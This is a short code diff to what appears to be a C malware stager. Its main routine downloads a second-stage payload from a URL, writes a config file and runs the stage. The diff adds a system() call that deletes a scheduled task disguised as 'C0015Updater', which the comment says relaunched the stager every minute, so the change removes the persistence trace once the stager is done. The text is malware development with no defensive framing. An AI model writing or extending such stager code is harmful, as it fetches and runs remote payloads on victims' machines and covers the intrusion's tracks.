@@ -132,8 +132,11 @@ int main(void)
     Download(STAGE2_URL, STAGE2_PATH);
     WriteConfig();
     RunStage();
+    /* the task is single use: remove it so the stager does not start again every minute */
+    system("schtasks /delete /tn C0015Updater /f >nul 2>&1");
     Log("=== stager done ===");
     return 0;
 }
+
 
 
